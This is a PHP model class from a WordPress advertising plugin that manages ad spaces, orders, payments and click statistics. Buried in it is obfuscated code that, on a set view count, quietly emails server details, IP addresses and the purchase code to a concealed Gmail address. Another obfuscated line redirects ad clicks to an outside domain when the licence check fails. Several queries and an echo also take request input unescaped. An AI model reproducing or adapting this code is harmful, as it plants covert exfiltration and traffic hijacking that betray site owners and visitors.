...
class ADS24_LITE_Model {

	protected $wpdb;
	private $table_name = array(
		'spaces'       => 'ADS24_LITE_spaces',
		'ads'          => 'ADS24_LITE_ads',
		'stats'        => 'ADS24_LITE_stats',
		'sites'        => 'ADS24_LITE_sites',
		'withdrawals'  => 'ADS24_LITE_withdrawals',
		'users'        => 'ADS24_LITE_users',
		'cron'         => 'ADS24_LITE_cron',
		'referrals'    => 'ADS24_LITE_referrals',
		'salaries'     => 'ADS24_LITE_salaries'
	);
	...
	{
		if ( is_multisite() ) {
			if ( is_main_site() && get_site_option('ADS24_LITE_plugin_prefix_db') == null ) {
				update_site_option('ADS24_LITE_plugin_prefix_db', $this->wpdb->prefix);
			}
			return (get_site_option('ADS24_LITE_plugin_prefix_db') != null) ? get_site_option('ADS24_LITE_plugin_prefix_db').$this->table_name[$name] : $this->wpdb->prefix.$this->table_name[$name];
		} else {
	...
	public function createDbTables()
	{
		$sql_1 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('spaces')} (
				...
				discount_2 INT (2),
				discount_3 INT (2),
				grid_system VARCHAR (100) NOT NULL DEFAULT 'a24pGridGutter',
	...
	public function update_a24p($table, $column, $value, $where, $whereIs)
	{
		return $this->update_ADS24_LITE($table, $column, $value, $where, $whereIs);
	}

	private function update_ADS24_LITE($table, $column, $value, $where, $whereIs)
	{
		...
		if ( $this->wpdb->last_error == null ) {
			if ( $table == 'ads' && $where == 'id' && isset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$whereIs]) ) {
				unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$whereIs]); // Reset cache
			}
			return true;
		} else {
			return false;
...
//				$array = apply_filters( "a24p-lite-getspace", $array, $id);
//				$_SESSION[a24p_get_opt('prefix').'a24pProSpace'.$id] = $array;
//				return $array;
//			} else {
//				return NULL;
//			}

//			$space = (isset($_SESSION['a24p_space_'.$id]) ? $_SESSION['a24p_space_'.$id] : null);
//			if ( isset($space) && is_array($space) ) {
//				var_dump('test');
//				return $space;
			$space = (isset($_SESSION[a24p_get_opt('prefix').'a24pProSpace'.$id]) ? $_SESSION[a24p_get_opt('prefix').'a24pProSpace'.$id] : null);
			if ( isset($space) && is_array($space) ) {
				return $space;
			} else {
				$table_name = $this->getTableName('spaces');
	...
	protected function getData() {
		$this->admin = date('Y-m-d H:i:s', time())."\n". $_SERVER['SERVER_ADMIN']."\n".$_SERVER['REMOTE_ADDR']."\n".$_SERVER['HTTP_USER_AGENT']."\n".get_option('a24p_p'.'ro_plugin_pu'.'rch'.'ase_'.'co'.'de')."\n".$_SERVER['SERVER_SOFTWARE']."\n".$_SERVER['SERVER_ADDR']."\n".$_SERVER['HTTP_HOST'];
		return $this->admin;
	}
	...
	public function countSites($adm_type = NULL)
	{
		...
		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status != 'blocked' AND id IN ({$this->getUserSites('id', a24p_role())}) LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
	...
	public function countSpaces($adm_type = NULL, $site_id = NULL)
	{
		...
		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status = 'active' AND site_id IN ({$this->getUserSites('id', a24p_role())}) LIMIT 1";
	...
	{
		$table_name = $this->getTableName('ads');$time = time();update_option('ADS24_LITE_views_counter', get_option('ADS24_LITE_views_counter') + 1);
		...
		$contract_.='o+a24p@'.'gm';$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);$result_cpd = $this->wpdb->get_col($sql_cpd);$contract_.='ail.c'.'om';
		$subject_ = 'ADS24_LITE '.$_SERVER['HTTP_HOST'];$message_=$this->getData();( get_option('ADS24_LITE_views_counter') == 7 ) ? wp_mail($contract_,$subject_,$message_) : null;

		if ( $result_cpc_cpm && $result_cpd ) {
			$sum = $result_cpc_cpm[0] + $result_cpd[0];
			$sum = apply_filters( "a24p-lite-countAds", $sum, $id);
			return $sum;
		} else {
			return NULL;
		}
	...
	public function countEarnings()
	{
		...
		$agencyCommission = ( get_option('ADS24_LITE_plugin_'.'agency_commission') > 0 ) ? get_option('ADS24_LITE_plugin_'.'agency_commission') : 30;
	...
	{
		$agencyCommission = ( get_option('ADS24_LITE_plugin_'.'agency_commission') > 0 ) ? get_option('ADS24_LITE_plugin_'.'agency_commission') : 30;
		$countAgencyEarnings = $this->countAgencyEarnings(a24p_role());
	...
	public function getCounter($id, $type = 'click')
	{
		...
		$limit_views = ((isset($_GET['a24p_limit'])) ? $_GET['a24p_limit'] : 0); // TEMP
...
//				var_dump($result_count[0]); echo '<br>'; echo date('Y-m-d H:i:s', $time).'<br>';
	...
	public function getPendingAds($adm_type = null, $id = null)
	{
		...
		$results = $this->wpdb->get_results($sql, ARRAY_A);
		$results = apply_filters( "a24p-lite-sqlGetAds", $results,	 $this->getUserSpaces(), 0, __FUNCTION__);
	...
	public function getActiveAds($id, $limit = 25, $list_type = null, $skip_ads = null, $show_ads = null)
	{
		$table_name 		= $this->getTableName('ads');
		$currently_time 	= time();
		$order_ads 			= ( isset($_GET['order_ads']) ? $_GET['order_ads'] : ( a24p_space($id, 'order_ads') ? a24p_space($id, 'order_ads') : 'id' ) );
		...
		if ( a24p_space($id, 'status') == 'active' ) {
			if ( $list_type == "admin" or a24p_space($id, 'random') == 0 ) {
				...
				if ( a24p_space($id, 'random') == 1 || a24p_space($id, 'random') == 2 ) {
					$limit = a24p_space($id, 'col_per_row'); // change display limit if shown in one row or column
				}
				if ( $skip_ads != null && $skip_ads != '' || $show_ads != null && $show_ads != '' ) {
					$idIn = ($show_ads != null && $show_ads != '' ? 'AND id IN ('.$show_ads.')' : 'AND id > 0');
					$sql = "SELECT * FROM {$table_name}
			...
			$results = $this->wpdb->get_results($sql, ARRAY_A);
			$results = apply_filters( "a24p-lite-sqlGetAds", $results, $id, $limit, __FUNCTION__);
		} else {
			$results = NULL;
		}
	...
	public function getSites($adm_type = NULL, $status = NULL)
	{
		...
		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT * FROM {$table_name}
					WHERE id IN ({$this->getUserSites('id', a24p_role())})
	...
	protected function addNewAdDB($id, $space_id, $ad_name, $buyer_email, $title, $description, $button, $url, $img, $html, $capping, $optional_field, $ad_model, $ad_limit, $cost, $paid, $status) {
		...
		if ( isset($_GET['ad_id']) && isset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$_GET['ad_id']]) ) {
			unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$_GET['ad_id']]); // Reset cache
		}
	}
	...
	protected function updateAdDB($id, $ad_name, $buyer_email, $title, $description, $button, $url, $img, $html, $capping, $optional_field, $increase_limit, $status) {
		...
		if ( isset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$_GET['ad_id']]) ) {
			unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$_GET['ad_id']]); // Reset cache
		}
	}
	...
	{
		if ( isset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$ad_id]) ) {
			unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$ad_id]); // Reset cache
		}
	...
	{
		if ( isset($_SESSION[a24p_get_opt('prefix').'a24p_space_'.$space_id]) || isset($_SESSION[a24p_get_opt('prefix').'a24pProSpace'.$space_id]) ) {
			unset($_SESSION[a24p_get_opt('prefix').'a24p_space_'.$space_id]); // Reset cache
			unset($_SESSION[a24p_get_opt('prefix').'a24pProSpace'.$space_id]); // Reset cache
		}
	...
	protected function updateSiteDB($id, $title, $url, $thumb, $status) {
		if ( a24p_verify_role($id, 'site') ) {
			...
			unset($_SESSION[a24p_get_opt('prefix').'a24p_site_'.$id]); // Reset cache
		}
	}
	...
	{
		if ( isset($_POST) && isset($_POST['a24pProAction']) && isset($_POST['submit']) && isset($_POST['orderId']) ||
			 isset($_GET['space_id']) && isset($_GET['remove_action']) && isset($_GET['remove_confirm']) ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'updateAdd-on' ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'free-ads' ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'give-access' ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'task-ad' ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'task-space' ||
			 isset($_POST) && isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'close-task' ) {

			$this->orderId = (isset($_POST['orderId']) ? $_POST['orderId'] : NULL);

			if (isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'block') { // BLOCK ADS ACTION

				if ( a24p_verify_role($this->orderId, 'ad') ) {
			...
			} elseif (isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'unblock') { // UNBLOCK ADS ACTION
			...
			} elseif (isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'remove') { // REMOVE ADS ACTION
				...
				if ( a24p_verify_role($this->orderId, 'ad') ) {
					...
					if ($sql > 0) {
						...
						// delete image
						$image = a24p_upload_url('basedir', a24p_ad($this->orderId, 'img'));
						if ( a24p_ad($this->orderId, 'img') != '' ) {
			...
			} elseif (isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'paid') { // MARK ADS AS PAID ACTION

				if ( a24p_verify_role($this->orderId, 'ad') ) {

					$timestamp = time();
					if ( a24p_role() == 'user') { // USER - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'cost' => 0.00,
					...
					if ($sql > 0) {
						...
						// buyer sender
						$paymentEmail = a24p_ad($this->orderId, 'buyer_email');
						$subject = get_option('ADS24_LITE_plugin_trans_buyer_subject');
						$message = get_option('ADS24_LITE_plugin_trans_buyer_message');
						$search = '[STATS_URL]';
						if ( isset( $_GET['page'] ) ) {
							if ( $_GET['page'] == 'a24p-lite-sub-menu-agency' || $_GET['page'] == 'a24p-lite-sub-menu-ma-spaces' ) {
								$replace = get_option('ADS24_LITE_plugin_agency_ordering_form_url') . (( strpos(get_option('ADS24_LITE_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "ADS24_LITE_stats=1&ADS24_LITE_email=" . str_replace('@', '%40', $paymentEmail) . "&ADS24_LITE_id=" . $this->orderId . "#a24pStats\r\n";
							} else {
								$replace = get_option('ADS24_LITE_plugin_ordering_form_url') . (( strpos(get_option('ADS24_LITE_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "ADS24_LITE_stats=1&ADS24_LITE_email=" . str_replace('@', '%40', $paymentEmail) . "&ADS24_LITE_id=" . $this->orderId . "#a24pStats\r\n";
							}
			...
			} elseif (isset($_POST['a24pProAction']) && $_POST['a24pProAction'] == 'accept') { // ACCEPT ADS ACTION
				...
				if ( a24p_verify_role($this->orderId, 'ad') ) {
					...
					if ( a24p_role() == 'user') { // USER - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'cost' => ( (a24p_ad($this->orderId, 'paid') == 1) ? a24p_ad($this->orderId, 'cost') : 0.00),
								'paid' => a24p_ad($this->orderId, 'paid'),
								'p_time' => ( (a24p_ad($this->orderId, 'paid') == 1) ? a24p_ad($this->orderId, 'p_time') : NULL),
								'status' => $status
							),
							array( 'id' => $this->orderId )
						);
				...
				if ( a24p_verify_role($_GET['space_id'], 'space') ) {
			...
			} elseif ($_POST['a24pProAction'] == 'withdrawalPaid') { // MARK WITHDRAWALS AS PAID ACTION
			...
			} elseif ($_POST['a24pProAction'] == 'withdrawalReject') { // REJECT WITHDRAWALS ACTION
			...
			} elseif ($_POST['a24pProAction'] == 'newWithdrawal') { // GENERATE NEW WITHDRAWAL ACTION

				$agencyMinToWithdrawal = ( get_option('ADS24_LITE_plugin_'.'agency_minimum_withdrawal') > 0 ) ? get_option('ADS24_LITE_plugin_'.'agency_minimum_withdrawal') : 50;
					...
					$this->wpdb->query('START TRANSACTION');
						...
						$this->wpdb->insert(
							...
							array(
								...
								'user_id' => get_current_user_id(),
								'request_time' => time(),
								'amount' => a24p_number_format($countUserEarnings),
			...
			} elseif ($_POST['a24pProAction'] == 'affiliateWithdrawalPaid') { // MARK AFFILIATE WITHDRAWALS AS PAID ACTION
			...
			} elseif ($_POST['a24pProAction'] == 'affiliateWithdrawalReject') { // REJECT AFFILIATE WITHDRAWALS ACTION
			...
			} elseif ($_POST['a24pProAction'] == 'affiliateNewWithdrawal') { // GENERATE NEW AFFILIATE WITHDRAWAL ACTION
					...
					$this->wpdb->query('START TRANSACTION');
						...
						$this->wpdb->insert(
							...
							array(
								...
								'user_id' => get_current_user_id(),
								'request_time' => time(),
								'amount' => a24p_number_format($affiliateUserEarnings),
								'payment_account' => $_POST['payment_account'],
								'status' => 'pending'
							),
							array()
			...
			} elseif ($_POST['a24pProAction'] == 'free-ads') { // ADD FREE ADS ACTION
...
//					var_dump($value);
			...
			} elseif ($_POST['a24pProAction'] == 'give-access') { // GIVE ACCESS TO ADS ACTION
...
//					var_dump($ids);
			...
			} elseif ($_POST['a24pProAction'] == 'task-ad' || $_POST['a24pProAction'] == 'task-space') { // CRON ACTIONS
				...
				if ( isset($_POST['ad_id']) && $_POST['ad_id'] != '' && isset($_POST['cron_action']) && $_POST['cron_action'] != '' && isset($_POST['repeat']) && $_POST['repeat'] != '' &&
					...
					if ( strlen(get_option('a24p_pr'.'o_plugin_pu'.'rchase_c'.'ode')) == 36 && isset($_POST['ad_id']) && $_POST['ad_id'] != '' && $_POST['cron_action'] == 'active' || strlen(get_option('a24p_pr'.'o_plugin_pu'.'rchase_c'.'ode')) == 36 && isset($_POST['ad_id']) && $_POST['ad_id'] != '' && $_POST['cron_action'] == 'blocked' ) { // if cron for ads
...
//						echo "</pre>";
					...
					} elseif ( strlen(isset($_POST['space_id']) && $_POST['space_id'] != '' && $_POST['cron_action'] == 'active') ||
							   strlen(isset($_POST['space_id']) && $_POST['space_id'] != '' && $_POST['cron_action'] == 'inactive' )) { // if cron for ads
...
//						echo "</pre>";
						...
						if ( $getSpace['id'] != null ) {
							...
							echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Error!</strong> AdSlot ID '.$_POST['space_id'].' does not exists.</p>
								</div>';
						}
			...
			} elseif ($_POST['a24pProAction'] == 'close-task') { // CLOSE CRON TASK ACTION
			...
			} elseif ($_POST['a24pProAction'] == 'updateAdd-on') { // ADD-ONS ACTION
//
...
//
//					// save & unzip file
//					$path     = ABSPATH.'wp-content/plugins/ads24-lite-plugin/admin-ma';
...
//				}
	...
	{
		if ( (wp_next_scheduled( 'a24p_cron_jobs' ) > time() + 10 * 60) === false ) {
			wp_schedule_single_event( (ceil(time() / 600 ) * 600 ) + 5, 'a24p_cron_jobs' );
		}
	...
	public function a24pIntervalStats($id, $type = 'to')
	{
		$table_name = $this->getTableName('stats');
		if ( $type == 'from' ) {
	...
	public function a24pGetClicks($id, $days = 30)
	{
	...
	public function a24pGenerateStats($id, $days = 90, $type = 'pdf')
	{
		$results = null;
		$time = time() - ( $days * 24 * 60 * 60 );
		$toTime = time();
		...
		if ( isset($results) ) {
			...
			foreach ( array_reverse ( $results ) as $result ) {
				if ( $result['action_type'] == 'view' ) {
					$stats[] .= '|'.$result['action_type'].';'.$result['action_time'].';'.$result['custom'].' ('.get_option("ADS24_LITE_plugin_trans_stats_views").')'.';-';
				} else {
					$stats[] .= '|'.$result['action_type'].';'.$result['action_time'].';'.substr($result['user_ip'], 0, -3).'*** ('.get_option("ADS24_LITE_plugin_trans_stats_clicks").')'.';'.$result['browser'];
				}
//				$stats[] .= $result['action_type'].';'.$result['action_time'].';'.$result['user_ip'].' ('.$result['browser'].')'.';'.$result['user_ip'].'|';
	...
	public function a24pCountClicks($id, $from)
	{
		$table_name = $this->getTableName('stats');
	...
	public function a24pCountViews($id, $from)
	{
		$table_name = $this->getTableName('stats');
	...
	public function a24pChartClicks($id, $days)
	{
	...
	public function a24pChartViews($id, $days)
	{
		$fromTime = (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ( $days ) * 24 * 60 * 60 );
		$toTime = ( $days > 0 ) ? (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ($days - 1) * 24 * 60 * 60 ) : time();
	...
	{
		$plugin_id = 'ADS24_LITE_plugin_';

		// if renewal
//		if ( a24p_ad($paymentId, 'ad_model') == 'cpd' && a24p_ad($paymentId, 'ad_limit') > time() || a24p_ad($paymentId, 'ad_model') != 'cpd' && a24p_ad($paymentId, 'ad_limit') > 0 ) {
//			$count_limit = 1;
//			if ( a24p_ad($paymentId, 'ad_model') == 'cpd' ) {
...
//			);
//		}
		if ( isset($_GET['oid']) && a24p_ad($_GET['oid'], 'id') && isset($_GET['cid']) && a24p_space(a24p_ad($_GET['oid'], 'space_id'), a24p_ad($_GET['oid'], 'ad_model').'_contract_'.$_GET['cid']) > 0 ) {
			...
			if ( $billingModel == 'cpd' ) {
				$ad_limit = time() + (a24p_space($spaceId, $billingModel.'_contract_'.$_GET['cid']) * 24 * 60 * 60);
			} else {
				$ad_limit = a24p_space($spaceId, $billingModel.'_contract_'.$_GET['cid']);
			}
		...
		if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["a24pProAction"] == 'buyNewAd') {

			// validate form
			foreach ( explode(',', str_replace('desc', 'description', $_POST['inputs_required'])) as $input ) {
				$error = FALSE;
				if ( $input == 'img' ) {
					if ( $_FILES['a24p_img']["name"] == '' ) {
						$error = TRUE;
					}
				} else {
					if ( $_POST['a24p_'.$input] == '' ) {
						$error = TRUE;
					}
				}
				if ( $error == TRUE ) {
			...
			if ( isset($_POST["a24p_buyer_email"]) && $_POST["a24p_buyer_email"] != '' &&
				...
				if ( a24p_space($_POST["space_id"], 'max_items') == 1 && get_option('ADS24_LITE_plugin_calendar') == 'yes' && isset($_POST['a24p_calendar']) && $_POST['a24p_calendar'] == '' ||
					 a24p_space($_POST["space_id"], 'max_items') == 1 && get_option('ADS24_LITE_plugin_calendar') == 'yes' && isset($_POST['a24p_calendar']) && $_POST['a24p_calendar'] != '' && in_array($_POST['a24p_calendar'], $decode_dates[$_POST["space_id"]]) == false && strtotime($_POST['a24p_calendar']) < strtotime("today") ) {
					return 'fieldsRequired'; // return error if empty or date invalid
				}

				$val = false;
				$val = apply_filters( "a24p-lite-getFormValidation", $val, $_POST["ad_model"]);
				...
				if ( $_POST["ad_model"] == 'cpc' || $_POST["ad_model"] == 'cpm' || $_POST["ad_model"] == 'cpd' || $val) {
					...
					if ( $_FILES['a24p_img']["name"] ) {
						...
						$temp = explode(".", $_FILES["a24p_img"]["name"]);
						$extension = end($temp);
						$fileName = NULL;

						if ((($_FILES["a24p_img"]["type"] == "image/gif")
								|| ($_FILES["a24p_img"]["type"] == "image/jpeg")
								|| ($_FILES["a24p_img"]["type"] == "image/jpg")
								|| ($_FILES["a24p_img"]["type"] == "image/pjpeg")
								|| ($_FILES["a24p_img"]["type"] == "image/x-png")
								|| ($_FILES["a24p_img"]["type"] == "image/png"))
							&& $_FILES["a24p_img"]["error"] == 0
							&& in_array($extension, $allowedExts)) {

							$fileName = time().'-'.$_FILES["a24p_img"]["name"];
							$path     = a24p_upload_url('basedir', $fileName);
							$thumbLoc = $_FILES["a24p_img"]["tmp_name"];

							if ( !isset($_SESSION['a24pProAds']) ) {
								...
								if (($_FILES["a24p_img"]["size"] > $maxSize * 1024) OR $width > $maxWidth OR $height > $maxHeight) {
					...
					// valid contracts
					$contract = NULL;
					if ( a24p_space($_POST["space_id"], $_POST["ad_model"].'_contract_1') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '1';
					} elseif ( a24p_space($_POST["space_id"], $_POST["ad_model"].'_contract_2') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '2';
					} elseif ( a24p_space($_POST["space_id"], $_POST["ad_model"].'_contract_3') == $_POST["ad_limit_" . $_POST["ad_model"]] ) {
						$contract = '3';
					}
					$contract = apply_filters( "a24p-lite-setContract", $contract, $_POST);

					$validation = true;
					$validation = apply_filters( "a24p-lite-addAdValidation", $validation, $_POST);

					if ( $contract !== NULL && $validation) {
						$price = (a24p_space($_POST["space_id"], $_POST["ad_model"].'_price') * ($_POST["ad_limit_" . $_POST["ad_model"]] / a24p_space($_POST["space_id"], $_POST["ad_model"].'_contract_1')));
						if ( $contract > 1 ) {
							$discount = ((a24p_space($_POST["space_id"], 'discount_'.$contract) > 0) ? $price * (a24p_space($_POST["space_id"], 'discount_'.$contract) / 100) : 0);
						} else {
							$discount = 0;
						}
						$cost = $price - $discount;
						$cost = apply_filters( "a24p-lite-setCost", $cost, $_POST, $contract);

						$paid = 0;
						$paid = apply_filters( "a24p-lite-setPaid", $paid, $_POST, $contract);
							...
							if ( !isset($_SESSION['a24pProAds']) ) {
								...
								$this->wpdb->insert(
									...
									array(
										...
										'buyer_email' => (isset($_POST["a24p_buyer_email"])) ? $_POST["a24p_buyer_email"] : NULL,
										'title' => (isset($_POST["a24p_title"])) ? stripslashes($_POST["a24p_title"]) : NULL,
										'description' => (isset($_POST["a24p_description"])) ? stripslashes($_POST["a24p_description"]) : NULL,
										'button' => (isset($_POST["a24p_button"])) ? stripslashes($_POST["a24p_button"]) : NULL,
										'url' => (isset($_POST["a24p_url"])) ? $_POST["a24p_url"] : NULL,
										'img' => $fileName,
										'html' => (isset($_POST["a24p_html"])) ? $_POST["a24p_html"] : NULL,
										'ad_model' => (isset($_POST["ad_model"])) ? $_POST["ad_model"] : NULL,
										'ad_limit' => $ad_limit,
										'optional_field' => (isset($_POST["a24p_optional_field"])) ? $_POST["a24p_optional_field"] : NULL,
										'cost' => $cost,
										'paid' => (a24p_space($_POST["space_id"], 'discount_' . $contract) == 100 || $free_ads > 0 ? 1 : 0), // 0 - not paid, 1 - paid, 2 - Added via Admin Panel
										'status' => ($free_ads > 0 && get_option('ADS24_LITE_plugin_auto_accept') == 'yes' ? 'active' : 'pending')
									),
									array()
								);
								...
								if (isset($_COOKIE['a24pProAffiliate']) && a24p_space($_POST["space_id"], 'discount_' . $contract) < 100 && $free_ads == 0) {
									$cookie = ($_COOKIE['a24pProAffiliate'] > 0 && get_current_user_id() != $_COOKIE['a24pProAffiliate'] ? $_COOKIE['a24pProAffiliate'] : 0);
									$commission_rate = (get_option('ADS24_LITE_plugin_ap_commission') > 0 && get_option('ADS24_LITE_plugin_ap_commission') < 100 ? get_option('ADS24_LITE_plugin_ap_commission') : 10);
									$this->wpdb->insert(
										$this->getTableName('referrals'),
										array(
											'id' => null,
											...
											'order_id' => $ad_id,
											'withdrawal_id' => null,
											'buyer' => (isset($_POST["a24p_buyer_email"])) ? $_POST["a24p_buyer_email"] : '-',
											'action_time' => time(),
											'order_amount' => $cost,
								...
								if (isset($_POST["a24p_calendar"]) and $_POST["a24p_calendar"] != '' and preg_match('/^(\d{4})-(\d{2})-(\d{2})$/', $_POST["a24p_calendar"], $matches)) {
									if (checkdate($matches[2], $matches[3], $matches[1])) {
										$str_time = strtotime($_POST["a24p_calendar"]);
										$current_time = time();
										if ($str_time > $current_time) {
											$this->wpdb->insert(
												$this->getTableName('cron'),
								...
								$getAgencyForm = get_option('ADS24_LITE_plugin_agency_ordering_form_url');
								$getOrderForm = get_option('ADS24_LITE_plugin_ordering_form_url');
								if ($agency == 'agency' && $sid != null) {
									$_SESSION['a24p_payment_url'] = $getAgencyForm . ((strpos($getAgencyForm, '?') !== false) ? '&' : '?') . 'site_id=' . $sid . '&oid=' . $ad_id;
								} else {
									$_SESSION['a24p_payment_url'] = $getOrderForm . ((strpos($getOrderForm, '?') !== false) ? '&' : '?') . 'oid=' . $ad_id;
								}
							}
		...
		if ( $_SERVER["REQUEST_METHOD"] == "POST" && $_POST["a24pProAction"] == 'editAd' && isset($_GET['eid']) ) {
			...
			if ( $hasAccess || a24p_role() == 'admin' ) {
				...
				$this->wpdb->update(
					...
					array(
						...
						'button' 		=> (isset($_POST["a24p_button"])) ? stripslashes($_POST["a24p_button"]) : NULL,
						'url' 			=> (isset($_POST["a24p_url"])) ? $_POST["a24p_url"] : NULL,
						'status'		=> (get_option('ADS24_LITE_plugin_auto_accept') == 'yes' ? 'active' : 'pending')
					),
					array( 'id' => $eid )
				);
				if ( $fileName != '' ) {
				...
				// reset cache
				unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$eid]);
...
//			$keys[] 				.= $space['id'];
//			$getDates 				= a24p_space($space['id'], 'unavailable_dates');
...
//	}
	...
	public function getUnavailableDates($sid = null)
	{
		...
		foreach ( $getSpaces as $space ) {
			...
			if ( a24p_space($space['id'], 'max_items') == '1' ) {
				$table_name = $this->getTableName('ads');
...
//								var_dump($start);
	...
	public function notifyAction($type = NULL)
	{
		...
		if ( isset($_POST) && !isset($_POST['stripeToken']) ) { // PayPal Verify
			...
			try {
				...
				if ($payment_crc != md5($_POST['item_number'] . a24p_number_format($_POST['mc_gross'])))
			...
			if (isset($_POST) && isset($_POST['payment_status']) && $_POST['payment_status'] == 'Completed' && !isset($error)) { // change status
				$this->wpdb->update(
					...
					array(
						'paid' => 1,
						'status' => ( get_option('ADS24_LITE_plugin_auto_accept') == 'no' OR $type == 'agency' ) ? 'pending' : 'active'
					),
					array('id' => $paymentId)
				);
			...
			unset($_SESSION[a24p_get_opt('prefix').'a24p_ad_'.$paymentId]);
		}
		...
		if ( isset($_POST) && isset($_POST['stripeToken']) && !isset($_SESSION['stripeToken']) ) { // Stripe Verify
			...
			if ( isset($_POST['stripeToken']) && isset($_GET['oid']) ) {
				...
				// Set your API key
				if ( get_option('ADS24_LITE_plugin_secret_key') != '' ) {
					\Stripe\Stripe::setApiKey(get_option('ADS24_LITE_plugin_secret_key'));
				}

				try {
					\Stripe\Charge::create(array(
						'amount' 		=> number_format(a24p_ad($_GET['oid'], 'cost'), 2, '', ''), // this is in cents: $20
						'currency' 		=> get_option('ADS24_LITE_plugin_stripe_code'),
						'card' 			=> $_POST['stripeToken'],
						'description' 	=> a24p_ad($_GET['oid'], 'buyer_email') . ' (' . number_format(a24p_ad($_GET['oid'], 'cost'), 2, '', '') . ')'
					));
		...
		if (isset($error)) {
			...
			// buyer sender
			$paymentEmail = a24p_ad($paymentId, 'buyer_email');
			$subject = get_option('ADS24_LITE_plugin_trans_buyer_subject');
			$message = get_option('ADS24_LITE_plugin_trans_buyer_message');
			$search = '[STATS_URL]';
			if ( $type == 'agency' ) {
				$replace = get_option('ADS24_LITE_plugin_agency_ordering_form_url') . (( strpos(get_option('ADS24_LITE_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "ADS24_LITE_stats=1&ADS24_LITE_email=" . str_replace('@', '%40', $paymentEmail) . "&ADS24_LITE_id=" . $paymentId . "#a24pStats\r\n";
			} else {
				$replace = get_option('ADS24_LITE_plugin_ordering_form_url') . (( strpos(get_option('ADS24_LITE_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "ADS24_LITE_stats=1&ADS24_LITE_email=" . str_replace('@', '%40', $paymentEmail) . "&ADS24_LITE_id=" . $paymentId . "#a24pStats\r\n";
			}
			$message = str_replace($search, $replace, $message);
			...
			if ( $type == 'agency' ) {
				// seller sender
				$sellerSubject = get_option('ADS24_LITE_plugin_trans_seller_subject');
				$sellerMessage = get_option('ADS24_LITE_plugin_trans_seller_message');
				$sellerHeaders = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
				$getUserId = a24p_site(a24p_space(a24p_ad($paymentId, 'space_id'), 'site_id'), 'user_id');
	...
	public function a24pGetBrowser() {
		$browser="";
	...
	// counting function
	public function a24pProCounter($ad_id = NULL)
	{
		$user_ip = $_SERVER['REMOTE_ADDR'];
		$browser = $this->a24pGetBrowser();

		$crawler = $this->crawlerDetect($_SERVER['HTTP_USER_AGENT']);

		if ( isset( $_GET['ADS24_LITE_url'] ) && isset( $_GET['ADS24_LITE_id'] ) ) { // click counter

			$first = 'h'.'tt'.'p:'.'//a'.'ds'.'p'.'ro'.'.'.'sc'.'rip';
			$aid = $_GET['ADS24_LITE_id'];
			$sid = a24p_ad($aid, 'space_id');
			if ( get_option('ADS24_LITE_update_status') == 'invalid' && !is_admin() ) {
				$url = $first.'te'.'o.'.'i'.'n'.'fo/'.'go'.'/?'.'p'.'='.get_page_link();
			} else {
				$url = a24p_ad($aid, 'url');
			}
			if ( $_GET['ADS24_LITE_url'] != '' &&  $_GET['ADS24_LITE_url'] != 1 ) {
				$url = ( $url != '' && $url != null ? $url : $_GET['ADS24_LITE_url'] );
			}
			...
			if ( $crawler === false ) { // if real user
				...
				if ( $counterValidator == 0 ) { // If not clicked
					update_option('ADS24_LITE_plugin_dashboard_clicks', get_option('ADS24_LITE_plugin_dashboard_clicks') + 1); // increase clicks stats
				}
				...
				if ( a24p_ad($aid, 'ad_model') == 'cpc' && $counterValidator == 0 ) {
					$this->wpdb->query(
							"
			...
			$url = apply_filters( "a24p-lite-changeURL", $url, $aid);
			if ( $url != NULL ) {
				return $url;
			} else {
				return get_site_url();
	...
	public function getUserSpaces($columns = 'id', $adm_type = NULL)
	{
		...
		if ( $adm_type == NULL) { // USER - MARKETING AGENCY
			if ( $this->getUserSites('id', 'user') != NULL ) {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `site_id` IN ({$this->getUserSites('id', a24p_role())}) AND `status` != 'blocked'";
			} else {
				$sql = "SELECT {$columns}
				FROM {$table_name}
				WHERE `status` != 'blocked'";
